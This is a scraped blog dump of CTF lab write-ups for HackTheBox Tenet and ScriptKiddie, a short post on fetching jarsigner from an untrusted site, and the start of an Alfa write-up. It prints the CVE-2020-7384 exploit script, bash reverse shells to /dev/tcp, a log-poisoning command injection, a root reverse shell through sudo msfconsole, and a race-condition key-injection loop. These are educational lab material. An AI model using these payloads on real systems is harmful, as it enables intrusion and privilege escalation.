Defaults entries for neil on tenet: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\: User neil may run the following commands on tenet: (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh neil@tenet:~$ ls -l /usr/local/bin/enableSSH.sh -rwxr-xr-x 1 root root 1080 Dec 8 2020 /usr/local/bin/enableSSH.sh Script analysis The following is the contents of enableSSH.sh\n#!/bin/bash  checkAdded() { sshName=$(/bin/echo $key | /usr/bin/cut -d \u0026#34; \u0026#34; -f 3) if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then /bin/echo \u0026#34;Successfully added $sshNameto authorized_keys file!\u0026#34; else /bin/echo \u0026#34;Error in adding $sshNameto authorized_keys file!\u0026#34; fi } checkFile() { if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then /bin/echo \u0026#34;Error in creating key file!\u0026#34; if [[ -f $1 ]]; then /bin/rm $1; fi exit 1 fi } addKey() { tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX) (umask 110; touch $tmpName) /bin/echo $key \u0026gt;\u0026gt;$tmpName checkFile $tmpName /bin/cat $tmpName \u0026gt;\u0026gt;/root/.ssh/authorized_keys /bin/rm $tmpName } key=\u0026#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu\u0026#34; addKey checkAdded The contents of the $key variable will be saved to a temporary file at /tmp/SSH-randomfilename before being added to the /root/.ssh/authorized_keys file by the addKey() function.\nneil@tenet:~$ tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX) neil@tenet:~$ echo $tmpName /tmp/ssh-4swbpcnN Then the checkAdded() function will take the username@hostname part from the value of $key which is root@ubuntu and check if it already exist in /root/.ssh/authorized_keys.\n...\u0026lt;SNIP\u0026gt;... if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then /bin/echo \u0026#34;Successfully added $sshNameto authorized_keys file!\u0026#34; else /bin/echo \u0026#34;Error in adding $sshNameto authorized_keys file!\u0026#34; fi ...\u0026lt;SNIP\u0026gt;... The idea here is if I could overwrite the file contents of /tmp/ssh-randomfilename with my own public key then I should be able to log in as root using my private key. So, it\u0026rsquo;s a race condition.\nExploiting enableSSH.sh Just like how I did earlier on ScriptKiddie, I\u0026rsquo;ll also use while loop to keep inserting my public key at /tmp/ssh-*, but this time, I\u0026rsquo;ll use a binary called tee.\nFirst, I\u0026rsquo;ll put my public key at Neil\u0026rsquo;s home directory.\nneil@tenet:~$ echo \u0026#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... root@iamf\u0026#39; \u0026gt; .iamf And tThen I\u0026rsquo;ll run this loop to make user neil keep doing sudo.\nneil@tenet:~$ while sleep 1; do sudo /usr/local/bin/enableSSH.sh; done; I\u0026rsquo;ll open another neil\u0026rsquo;s session and run this\nneil@tenet:~$ while sleep 0.1; do cat .iamf | tee /tmp/ssh-*;done On my Kali, I will do SSH login in loop.\n→ root@kali «tenet» «10.10.14.31» $ while sleep 1; do ssh -oConnectTimeout=1s -oPasswordAuthentication=no root@10.10.10.223 2\u0026gt;/dev/null; done After some minutes, I can finally login as root.\n→ root@kali «tenet» «10.10.14.31» $ ssh root@10.10.10.223 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64) ...\u0026lt;SNIP\u0026gt;... Last login: Tue Jun 15 09:50:37 2021 from 10.10.14.53 root@tenet:~# id uid=0(root) gid=0(root) groups=0(root) Root flag is done here.\nReferences  https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-tenet/","summary":"Tenet is a medium difficulty Linux machine from Hack The Box. It features a basic PHP deserialization vulnerability, which can be leveraged to gain a foothold. Inside the system, enumeration of the web configuration files reveals a set of database credentials, and these are reused for SSH login. There is a sudo privileges on a custom script, and it can be used to escalate myself into root account if I win a race condition against it.","tags":["Linux","WordPress","PHP","Deserialization","Code-Review","Password-reuse","Race-condition","sudo","WPscan","ffuf","Cewl"],"title":"HackTheBox - Tenet"},{"content":"The PoC exploit of ScriptKiddie from HackTheBox actually requires a binary known as jarsigner . The binary itself is bundled with the Java SDK, and my Kali Linux definitely has it, so I should have that binary installed. However, I was unable to locate this jarsigner on my machine.\nI started to look for it on the internet, simply because I didn\u0026rsquo;t want to reinstall the Java SDK on my machine just to get this single binary file, which could potentially mess up the current system/installed apps. But, most of the search results that showed up was a bunch of documentations about how to use the binary 🙃.\nIn search of the missing binary - Google dork Fortunately, I discovered some sites that provided the single jarsigner binary using Google dorks.\nintitle:\u0026quot;index of /\u0026quot; bin jarsigner I end up with this site:\nI have the binary, but it can not be used yet by just simply putting the binary into the Java PATH.\nInstalling jarsigner It turns out that Java binary needs to be \u0026lsquo;symlinked\u0026rsquo;.\nSo, first, I\u0026rsquo;ll have to find out where is my Java binary located.\n$ ls -l $(which java) lrwxrwxrwx 1 root root 22 Nov 25 2019 /usr/bin/java -\u0026gt; /etc/alternatives/java $ ls -l /etc/alternatives/java lrwxrwxrwx 1 root root 43 Nov 25 2019 /etc/alternatives/java -\u0026gt; /usr/lib/jvm/java-11-openjdk-amd64/bin/java I\u0026rsquo;ll grab the jarsigner binary from the site and drop it directly under /usr/lib/jvm/java-11-openjdk-amd64/bin/\n$ curl -s http://www.citrucoop.es/jdk-11.0.6/bin/jarsigner \u0026gt; /usr/lib/jvm/java-11-openjdk-amd64/bin/jarsigner Then, I\u0026rsquo;ll make a symlink of jarsigner at /usr/bin/\n$ cd /usr/bin $ ln -sf /usr/lib/jvm/java-11-openjdk-amd64/bin/jarsigner jarsigner It\u0026rsquo;s working fine now.\nHold up.. isn\u0026rsquo;t it unsafe? 🤔\nAbsolutely! 😅 so don\u0026rsquo;t ever do this if you don\u0026rsquo;t trust the site.\n","permalink":"https://fahmifj.github.io/blog/install-jar-signer-without-java-sdk/","summary":"The PoC exploit of ScriptKiddie from HackTheBox actually requires a binary known as jarsigner . The binary itself is bundled with the Java SDK, and my Kali Linux definitely has it, so I should have that binary installed. However, I was unable to locate this jarsigner on my machine.\nI started to look for it on the internet, simply because I didn\u0026rsquo;t want to reinstall the Java SDK on my machine just to get this single binary file, which could potentially mess up the current system/installed apps.","tags":["nanoblog","jarsigner","dorking"],"title":"Install jarsigner without Java SDK in Kali Linux"},{"content":"ScriptKiddie is all about exploiting exploitation tools. It starts by exploiting CVE-2020-7384, which allows me to gain a foothold by crafting a malicious APK that executes a reverse shell when used as APK template on msfvenom. There is a script which automatically runs a nmap scan against a host from a log file. The script can be exploited by poisoning the log with a reverse shell. For the last part, a sudo privileges on msfconsole can be leveraged to gain a root access.\nSkills Learned  Exploiting Metasploit CVE-2020-7384 Log poisoning Exploiting sudo privileges  Tools  Nmap CVE-2020-7384 PoC  Reconnaissance Nmap Full port scan with nmap discovers two open ports: SSH on port 22, and UPnP on port 5000\n→ root@kali «scriptkiddie» «10.10.14.31» $ nmap -p- --min-rate 1000 --reason -oA nmap/10-tcp-allport 10.10.10.226 Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-13 20:42 EDT Nmap scan report for 10.10.10.226 Host is up, received echo-reply ttl 63 (0.065s latency). Not shown: 65533 closed ports Reason: 65533 resets PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 5000/tcp open upnp syn-ack ttl 63 Nmap done: 1 IP address (1 host up) scanned in 45.79 seconds With default script scan, nmap identifies that port 5000 is actually a web application hosted using Python.\n→ root@kali «scriptkiddie» «10.10.14.31» $ nmap -p22,5000 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.226 Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-13 20:44 EDT Nmap scan report for 10.10.10.226 Host is up (0.056s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 5000/tcp open http Werkzeug httpd 0.16.1 (Python 3.8.5) |_http-server-header: Werkzeug/0.16.1 Python/3.8.5 |_http-title: k1d\u0026#39;5 h4ck3r t00l5 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.66 second Enumeration TCP 5000 - Website The site provides several online hacking tools.\nThe nmap tool can be used to scan against itself.\nThe IP field doesn\u0026rsquo;t accept others inputs except IPv4, so I don\u0026rsquo;t thing it can be abused, but I\u0026rsquo;ll note the nmap version.\nThe next tool is msfvenom, it can be used to generate a reverse shell binary. It has three options on the OS: Windows, Linux and Android. There is also a template option, for example, you can embed your payload to Windows\u0026rsquo;s calc.exe.\nSomehow, it can only generate payload for Windows and Android.\nThe payload is available for 5 mins at http://10.10.10.226:5000/static/payloads/[here].\nThe last tool is searchsploit, I tried to stack the commands but it returned this message.\nFinding Tools Vulnerabilities I can\u0026rsquo;t get the tools version except for nmap, so I searched some exploits around before the box release date (February 2021) on Exploit-DB and here is what I found.\nAnd that is probably what I need.\nI typed \u0026ldquo;msfvenom\u0026rdquo; on the site too, and the exploit also appeared there.\nFoothold Shell as kid Mfvenom CVE-2020-7384 I\u0026rsquo;ll use this exploit, but I\u0026rsquo;ll change the payload and the template location to my current working directory.\n#!/usr/bin/env python3 import subprocess import tempfile import os from base64 import b32encode # Change me payload = \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.31/9000 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; # b32encode to avoid badchars (keytool is picky) # thanks to @fdellwing for noticing that base64 can sometimes break keytool # \u0026lt;https://github.com/justinsteven/advisories/issues/2\u0026gt; payload_b32 = b32encode(payload.encode()).decode() dname = f\u0026#34;CN=\u0026#39;|echo {payload_b32}| base32 -d | sh #\u0026#34; print(f\u0026#34;[+] Manufacturing evil apkfile\u0026#34;) print(f\u0026#34;Payload: {payload}\u0026#34;) print(f\u0026#34;-dname: {dname}\u0026#34;) print() tmpdir = \u0026#34;./\u0026#34; apk_file = os.path.join(tmpdir, \u0026#34;evil.apk\u0026#34;) empty_file = os.path.join(tmpdir, \u0026#34;empty\u0026#34;) keystore_file = os.path.join(tmpdir, \u0026#34;signing.keystore\u0026#34;) storepass = keypass = \u0026#34;password\u0026#34; key_alias = \u0026#34;signing.key\u0026#34; open(empty_file, \u0026#34;w\u0026#34;).close() subprocess.check_call([\u0026#34;zip\u0026#34;, \u0026#34;-j\u0026#34;, apk_file, empty_file]) subprocess.check_call([\u0026#34;keytool\u0026#34;, \u0026#34;-genkey\u0026#34;, \u0026#34;-keystore\u0026#34;, keystore_file, \u0026#34;-alias\u0026#34;, key_alias, \u0026#34;-storepass\u0026#34;, storepass, \u0026#34;-keypass\u0026#34;, keypass, \u0026#34;-keyalg\u0026#34;, \u0026#34;RSA\u0026#34;, \u0026#34;-keysize\u0026#34;, \u0026#34;2048\u0026#34;, \u0026#34;-dname\u0026#34;, dname]) subprocess.check_call([\u0026#34;jarsigner\u0026#34;, \u0026#34;-sigalg\u0026#34;, \u0026#34;SHA1withRSA\u0026#34;, \u0026#34;-digestalg\u0026#34;, \u0026#34;SHA1\u0026#34;, \u0026#34;-keystore\u0026#34;, keystore_file, \u0026#34;-storepass\u0026#34;, storepass, \u0026#34;-keypass\u0026#34;, keypass, apk_file, key_alias]) print() print(f\u0026#34;[+] Done! apkfile is at {apk_file}\u0026#34;) print(f\u0026#34;Do: msfvenom -x {apk_file}-p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null\u0026#34;) It produces a file called evil.apk and it also shows the exploit commands.\n→ root@kali «exploits» «10.10.14.31» $ python3 exploit_msfvenom.py [+] Manufacturing evil apkfile Payload: bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.31/9000 0\u0026gt;\u0026amp;1\u0026#34; -dname: CN=\u0026#39;|echo MJQXG2BAFVRSAITCMFZWQIBNNEQD4JRAF5SGK5RPORRXALZRGAXDCMBOGE2C4MZRF44TAMBQEAYD4JRREI====== | base32 -d | sh # adding: empty (stored 0%) jar signed. Warning: The signer\u0026#39;s certificate is self-signed. [+] Done! apkfile is at ./evil.apk Do: msfvenom -x ./evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null Reverse shell - kid I\u0026rsquo;ll setup a nc listener on port 9000, then I\u0026rsquo;ll upload the evil.apk file as the template file and then I\u0026rsquo;ll click on the generate button.\nOn my listener, I\u0026rsquo;ve a shell now as user kid.\nroot@kali «exploits» «10.10.14.31» $ nc -nvlp 9000 listening on [any] 9000 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.226] 34230 bash: cannot set terminal process group (897): Inappropriate ioctl for device bash: no job control in this shell kid@scriptkiddie:~/html$ Shell upgrade I\u0026rsquo;ll upgrade my shell first.\n→ root@kali «exploits» «10.10.14.31» $ nc -nvlp 9000 listening on [any] 9000 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.226] 34230 bash: cannot set terminal process group (897): Inappropriate ioctl for device bash: no job control in this shell kid@scriptkiddie:~/html$ id uid=1000(kid) gid=1000(kid) groups=1000(kid) kid@scriptkiddie:~/html$ export TERM=xterm export TERM=xterm kid@scriptkiddie:~/html$ which python which python kid@scriptkiddie:~/html$ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; kid@scriptkiddie:~/html$ ^Z [1] + 10652 suspended nc -nvlp 9000 → root@kali «exploits» «10.10.14.31» $ stty raw -echo; fg [1] + 10652 continued nc -nvlp 9000 kid@scriptkiddie:~/html$ User flag is done here.\nkid@scriptkiddie:~/html$ cd ~ kid@scriptkiddie:~$ ls -la total 60 ...\u0026lt;SNIP\u0026gt;... -rw-r--r-- 1 kid kid 807 Feb 25 2020 .profile drwx------ 2 kid kid 4096 Feb 10 16:11 .ssh -rw-r--r-- 1 kid kid 0 Jan 5 11:10 .sudo_as_admin_successful drwxrwxr-x 5 kid kid 4096 Feb 3 11:03 html drwxrwxrwx 2 kid kid 4096 Feb 3 07:40 logs drwxr-xr-x 3 kid kid 4096 Feb 3 11:48 snap -r-------- 1 kid kid 33 Jun 12 11:35 user.txt Privilege Escalation Shell as pwn Internal Enumeration On kid\u0026rsquo;s home, there\u0026rsquo;s a folder called logs. The logs folder contains one file called hackers, but the content is empty.\nkid@scriptkiddie:~/logs$ ls -la total 8 drwxrwxrwx 2 kid kid 4096 Feb 3 07:40 . drwxr-xr-x 11 kid kid 4096 Feb 3 11:49 .. -rw-rw-r-- 1 kid pwn 0 Jun 14 01:40 hackers I did a quick check on the available users who have shells. It looks like I need to escalate to pwn.\nkid@scriptkiddie:~$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash kid:x:1000:1000:kid:/home/kid:/bin/bash pwn:x:1001:1001::/home/pwn:/bin/bash Searching files owned by user pwn discovers one script called scanlosers.sh.\nkid@scriptkiddie:~$ find / -type f -user pwn 2\u0026gt;/dev/null /home/pwn/.bash_logout /home/pwn/.selected_editor /home/pwn/.bashrc /home/pwn/.profile /home/pwn/scanlosers.sh The script is writable by me.\nkid@scriptkiddie:~$ ls -l /home/pwn/scanlosers.sh -rwxrwxr-- 1 pwn pwn 250 Jan 28 17:57 /home/pwn/scanlosers.sh Script analysis The script is most likely linked with kid\u0026rsquo;s hack tools website and probably can be abused with stacked command, but I need to find how the log in hackers file is formatted.\nkid@scriptkiddie:~$ cat /home/pwn/scanlosers.sh #!/bin/bash # \u0026lt;== Define log log=/home/kid/logs/hackers cd /home/pwn/ cat $log | cut -d\u0026#39; \u0026#39; -f3- | sort -u | while read ip; do sh -c \u0026#34;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip}2\u0026gt;\u0026amp;1 \u0026gt;/dev/null\u0026#34; \u0026amp; done # \u0026lt;== The log is cleared immediately if [[ $(wc -l \u0026lt; $log) -gt 0 ]]; then echo -n \u0026gt; $log; fi Looking back into the web source code, I find how the log is formatted in a function called searchsploit. Inserting malicious input on the kid\u0026rsquo;s hack tools will trigger the else condition on this function, which logs date and IP.\n...\u0026lt;SNIP\u0026gt;... def searchsploit(text, srcip): if regex_alphanum.match(text): result = subprocess.check_output([\u0026#39;searchsploit\u0026#39;, \u0026#39;--color\u0026#39;, text]) return render_template(\u0026#39;index.html\u0026#39;, searchsploit=result.decode(\u0026#39;UTF-8\u0026#39;, \u0026#39;ignore\u0026#39;)) else: with open(\u0026#39;/home/kid/logs/hackers\u0026#39;, \u0026#39;a\u0026#39;) as f: f.write(f\u0026#39;[{datetime.datetime.now()}] {srcip}\\n\u0026#39;) return render_template(\u0026#39;index.html\u0026#39;, sserror=\u0026#34;stop hacking me - well hack you back\u0026#34;) ...\u0026lt;SNIP\u0026gt;... I can trigger an event that logs my IP in the hackers file but then the logs is cleared so fast that I couldn\u0026rsquo;t catch it with the watch command.\nBut with this, I could guess that this script is intended as a \u0026lsquo;counter attack\u0026rsquo;. From here, I know that scanlosers.sh is executed automatically after a malicious attempt is performed on the site.\nI could generate the same log format in one line:\n→ root@kali «exploits» «10.10.14.31» $ python3 -c \u0026#34;from datetime import datetime; print(f\u0026#39;[{datetime.now()}] 127.0.0.1\u0026#39;)\u0026#34; [2021-06-14 00:43:54.924946] 127.0.0.1 To exploit the script, I have to trick this line from scanlosers.sh\necho $log | cut -d\u0026#39; \u0026#39; -f3- | sort -u What that line does is it extracts the IP address from the log.\n→ root@kali «exploits» «10.10.14.31» $ log=\u0026#39;[2021-06-14 00:28:09.560444] 127.0.0.1\u0026#39; → root@kali «exploits» «10.10.14.31» $ echo $log | cut -d\u0026#39; \u0026#39; -f3- | sort -u 127.0.0.1 From here, I\u0026rsquo;ll just add a semi-colon and a space before putting my reverse shell.\n[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.30/9000 0\u0026gt;\u0026amp;1\u0026#39;; It becomes a stacked command.\n→ root@kali «exploits» «10.10.14.31» $ echo \u0026#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.30/9000 0\u0026gt;\u0026amp;1\u0026#39;;\u0026#34; | cut -d\u0026#39; \u0026#39; -f3- | sort -u 127.0.0.1; bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.30/9000 0\u0026gt;\u0026amp;1\u0026#39;; If I map that format to this line:\nsh -c \u0026quot;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2\u0026gt;\u0026amp;1 \u0026gt;/dev/null\u0026quot; It turns into this:\nsh -c \u0026#34;nmap --top-ports 10 -oN recon/127.0.0.1; bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.30/9000 0\u0026gt;\u0026amp;1\u0026#39;;.nmap 127.0.0.1; bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.30/9000 0\u0026gt;\u0026amp;1\u0026#39;; 2\u0026gt;\u0026amp;1 \u0026gt;/dev/null\u0026#34; Exploitation Since the logs is cleared automatically, I\u0026rsquo;ll use while loop to keep inserting my malicious log to the hackers file and setup my listener on port 9001.\nkid@scriptkiddie:~/logs$ while sleep 0.1; do echo \u0026#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.31/9001 0\u0026gt;\u0026amp;1\u0026#39;;\u0026#34; \u0026gt; hackers; done On my listener:\n→ root@kali «scriptkiddie» «10.10.14.31» $ nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.226] 33110 bash: cannot set terminal process group (868): Inappropriate ioctl for device bash: no job control in this shell pwn@scriptkiddie:~$ id id uid=1001(pwn) gid=1001(pwn) groups=1001(pwn) Shell as root Sudo - msfconsole User pwn has sudo privileges on msfconsole.\npwn@scriptkiddie:~$ sudo -l sudo -l Matching Defaults entries for pwn on scriptkiddie: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User pwn may run the following commands on scriptkiddie: (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole To exploit this I could just send a reverse shell using -x options and then I\u0026rsquo;ll wait on my nc listener.\npwn@scriptkiddie:~$ sudo msfconsole -q -x \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.31/9005 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; And I\u0026rsquo;m rooted\n→ root@kali «scriptkiddie» «10.10.14.31» $ rlwrap nc -nvlp 9005 listening on [any] 9005 ... connect to [10.10.14.31] from (UNKNOWN) [10.10.10.226] 43512 bash: cannot set terminal process group (868): Inappropriate ioctl for device bash: no job control in this shell root@scriptkiddie:/home/pwn# id id uid=0(root) gid=0(root) groups=0(root) root@scriptkiddie:/home/pwn# cut -c-15 /root/root.txt cut -c-15 /root/root.txt bf7edd4c58e4420 References  https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/ https://discuss.getsol.us/d/4656-java-command-unknown-after-update/3 http://www.citrucoop.es/jdk-11.0.6/bin/  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/","summary":"ScriptKiddie is all about exploiting exploitation tools. It starts by exploiting CVE-2020-7384, which allows me to gain a foothold by crafting a malicious APK that executes a reverse shell when used as APK template on msfvenom. There is a script which automatically runs a nmap scan against a host from a log file. The script can be exploited by poisoning the log with a reverse shell. For the last part, a sudo privileges on msfconsole can be leveraged to gain a root access.","tags":["Linux","Metasploit","CVE-2020-7384","Sudo","Metasploit","Msfvenom"],"title":"HackTheBox - ScriptKiddie"},{"content":"Alfa starts with enumeration on FTP to obtain a username and an image file, and the image file is named after the user\u0026rsquo;s pet. Alfa\u0026rsquo;s website has a robots.txt file which contains an obfuscated web path to intranet chat support. The chat conversation reveals sensitive information, and with this, I\u0026rsquo;m able to guess the user\u0026rsquo;s password and gain a foothold on the system. In the user\u0026rsquo;s home directory, there is a VNC password and it can be used to log into the currently running VNC server as root.\nSkills Learned  Generating password list Brute-force FTP and SSH VNC password decrypt SSH tunneling  Tools  Nmap Hydra Crackmapexec FTP client Gobuster Brainfuck decoder - https://www.dcode.fr/brainfuck-language VNCviewer pspy  Reconnaissance Nmap An initial scan with nmap discovers four open ports: FTP on port 21, HTTP on port 80, SMB on port 139 and 445.\n→ root@iamf «alfa» «192.168.2.103» $ nmap -sC -sV -oA nmap/10-initial-alfa 192.168.2.109 -v # Nmap 7.80 scan initiated Thu Apr 22 02:41:12 2021 as: nmap -sC -sV -oA nmap/10-initial-alfa -v 192.168.2.109 Nmap scan report for 192.168.2.109 Host is up (0.00056s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_drwxr-xr-x 2 0 0 4096 Dec 17 13:02 thomas | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:192.168.2.103 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 80/tcp open http Apache httpd 2.4.38 ((Debian)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Alfa IT Solutions 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP) MAC Address: 08:00:27:9C:8A:46 (Oracle VirtualBox virtual NIC) Service Info: Host: ALFA; OS: Unix Host script results: |_clock-skew: mean: -40m01s, deviation: 1h09m16s, median: -2s | nbstat: NetBIOS name: ALFA, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: \u0026lt;unknown\u0026gt; (unknown) | Names: | ALFA\u0026lt;00\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | ALFA\u0026lt;03\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | ALFA\u0026lt;20\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | \\x01\\x02__MSBROWSE__\\x02\u0026lt;01\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;00\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;1d\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; |_ WORKGROUP\u0026lt;1e\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | smb-os-discovery: | OS: Windows 6.1 (Samba 4.9.5-Debian) | Computer name: alfa | NetBIOS computer name: ALFA\\x00 | Domain name: \\x00 | FQDN: alfa |_ System time: 2021-04-22T08:41:36+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-04-22T06:41:36 |_ start_date: N/A Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Apr 22 02:41:38 2021 -- 1 IP address (1 host up) scanned in 26.16 seconds nmap identified anonymous access is allowed on FTP.\nPerforming a full port scan, discovers the fifth port.\n→ root@iamf «alfa» «192.168.2.103» $ nmap -p- nmap/10-allports-alfa 192.168.2.109 -v Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-22 02:53 EDT Nmap scan report for 192.168.2.109 Host is up (0.00040s latency). Not shown: 65530 closed ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 139/tcp open netbios-ssn 445/tcp open microsoft-ds 65111/tcp open unknown MAC Address: 08:00:27:9C:8A:46 (Oracle VirtualBox virtual NIC) Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 36.32 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB) Poking port 65111 with nc reveals it\u0026rsquo;s SSH.\n→ root@iamf «alfa» «192.168.2.103» $ nc 192.168.2.109 65111 SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2 Enumeration TCP 21 - FTP Enumeration with on FTP discovers a potential username called thomas, an image file named milo.jpg.\n→ root@iamf «alfa» «192.168.2.103» $ ftp 192.168.2.109 Connected to 192.168.2.109. 220 (vsFTPd 3.0.3) Name (192.168.2.109:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 0 4096 Dec 17 13:02 thomas 226 Directory send OK. ftp\u0026gt; cd thomas 250 Directory successfully changed. ftp\u0026gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 104068 Dec 17 12:49 milo.jpg milo.jpg is a picture of a dog.\nTCP 445 - SMB On SMB, anonymous access is allowed but no read permission there.\n→ root@iamf «alfa» «192.168.2.103» $ crackmapexec smb 192.168.2.109 -u \u0026#39;ANONYMOUS\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 192.168.2.109 445 ALFA [*] Windows 6.1 (name:ALFA) (domain:) (signing:False) (SMBv1:True) SMB 192.168.2.109 445 ALFA [+] \\ANONYMOUS: SMB 192.168.2.109 445 ALFA [+] Enumerated shares SMB 192.168.2.109 445 ALFA Share Permissions Remark SMB 192.168.2.109 445 ALFA ----- ----------- ------ SMB 192.168.2.109 445 ALFA print$ Printer Drivers SMB 192.168.2.109 445 ALFA IPC$ IPC Service (Samba 4.9.5-Debian) TCP 80 - Web Visiting port 80 shows a website titled with \u0026ldquo;Alfa IT Solutions\u0026rdquo;.\nNothing useful on the page source.\nGobuster gobuster scan discovers a robot.txt file\n→ root@iamf «alfa» «192.168.2.103» $ gobuster dir -u http://192.168.2.109/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -o gobuster/gobuster-L-80 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.2.109/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: html,txt,bak [+] Timeout: 10s =============================================================== 2021/04/22 02:46:48 Starting gobuster in directory enumeration mode =============================================================== /js 